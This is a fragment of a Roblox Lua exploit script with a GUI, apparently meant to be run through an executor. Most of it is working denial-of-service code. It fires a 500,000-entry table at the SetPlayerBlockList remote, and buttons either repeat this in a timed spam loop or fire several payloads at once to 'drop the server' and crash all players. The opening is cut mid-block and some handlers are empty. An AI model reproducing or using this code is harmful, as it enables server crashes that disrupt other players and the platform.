                    if gui:IsA("TextLabel") or gui:IsA("TextButton") then
                        if gui.Text and gui.Text:find("CommandLimitPerMinute") then

                                end

                            end
                        end
                    end
                end
            end)

        end
    end)
end

-- Core Crash Payload Function
local function triggerCoreCrash()
    pcall(function()
        local remote = game:FindFirstChild("RobloxReplicatedStorage") and game.RobloxReplicatedStorage:FindFirstChild("SetPlayerBlockList")
        if remote then
            local entries = 500000
            local payload = table.create(entries)
            for i = 1, entries do
                payload[i] = { id = i, v = i * 2 }
            end
            remote:FireServer(payload)
        end
    end)
end

-- ==========================================
-- TIMED SPAM LOOP (Count & Delay)
-- ==========================================
BurstBtn.MouseButton1Click:Connect(function()
    local count = tonumber(CountBox.Text) or 5
    local delayTime = tonumber(DelayBox.Text) or 2
    
    -- Stop any existing active loops first
    for _, loopState in pairs(getgenv().ServerCrasherLoops) do
        loopState.active = false
    end
    
    local myLoopState = { active = true }
    table.insert(getgenv().ServerCrasherLoops, myLoopState)
    
    Status.Text = "Status: Spamming (0/" .. count .. ")"
    
    task.spawn(function()
        for i = 1, count do
            if not myLoopState.active then break end
            
            triggerCoreCrash()
            Status.Text = "Status: Spamming (" .. i .. "/" .. count .. ")"
            
            if i < count then
                local elapsed = 0
                while elapsed < delayTime do
                    if not myLoopState.active then break end
                    task.wait(0.1)
                    elapsed = elapsed + 0.1
                end
            end
        end
        
        if myLoopState.active then
            Status.Text = "Status: Completed (" .. count .. " sent)"
            myLoopState.active = false
        else
            Status.Text = "Status: Stopped"
        end
    end)
end)

-- Stop button event
StopBtn.MouseButton1Click:Connect(function()

end)

InstantCrashBtn.MouseButton1Click:Connect(function()

    Status.Text = "Status: Crashing All Players..."
    
    -- Instantly fire multiple heavy payloads concurrently to drop the server right away
    task.spawn(function()
        for i = 1, 5 do
            task.spawn(function()
                triggerCoreCrash()
            end)
        end
    end)
end)
